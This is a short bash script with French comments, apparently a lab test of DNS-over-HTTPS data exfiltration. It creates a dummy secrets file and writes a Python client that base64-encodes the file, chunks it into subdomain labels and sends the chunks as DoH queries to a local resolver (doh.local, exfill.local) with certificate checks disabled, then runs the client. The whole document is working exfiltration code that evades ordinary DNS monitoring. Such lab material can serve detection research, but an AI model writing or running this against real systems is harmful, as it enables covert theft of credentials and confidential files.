#!/bin/bash

echo "=== Test d'exfiltration DoH ==="

# Copier les fichiers d'exfiltration dans le conteneur client
echo "Préparation des fichiers d'exfiltration..."

# Installer requests si nécessaire
pip3 install requests

# Créer le fichier secret dans le conteneur
cat > /tmp/secret.txt << 'EOF'
Informations confidentielles :
Mot de passe admin : SuperSecret123!
Clé API : sk-1234567890abcdef
Données sensibles pour test d'exfiltration via DoH
EOF

# Créer le script d'exfiltration adapté
cat > /tmp/exfil_client.py << 'EOF'
import base64
import requests
import time
import random
import string

DOH_SERVER = "https://doh.local/dns-query"
DOMAIN = "exfill.local"
CHUNK_SIZE = 30

def random_subdomain(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def encode_and_split_file(filepath):
    with open(filepath, "rb") as f:
        b64 = base64.urlsafe_b64encode(f.read()).decode()
    return [b64[i:i + CHUNK_SIZE] for i in range(0, len(b64), CHUNK_SIZE)]

def send_chunk(chunk, index, total):
    subdomain = f"{index}-{chunk}.{random_subdomain()}.{DOMAIN}"
    params = {
        "name": subdomain,
        "type": "A"
    }
    headers = {
        "accept": "application/dns-json"
    }
    try:
        r = requests.get(DOH_SERVER, params=params, headers=headers, timeout=5, verify=False)
        print(f"[+] Sent chunk {index+1}/{total}: {subdomain}")
        if r.status_code == 200:
            print(f"    Response: {r.json().get('Status', 'Unknown')}")
    except Exception as e:
        print(f"[-] Failed to send chunk {index+1}: {e}")

def main():
    print("🚨 Starting data exfiltration via DoH...")
    chunks = encode_and_split_file("/tmp/secret.txt")
    print(f"📦 File split into {len(chunks)} chunks")
    
    for i, chunk in enumerate(chunks):
        send_chunk(chunk, i, len(chunks))
        time.sleep(1)  # Délai pour observation
    
    print("✅ Exfiltration completed!")

if __name__ == "__main__":
    main()
EOF

echo "🚀 Lancement de l'exfiltration..."
python3 /tmp/exfil_client.py
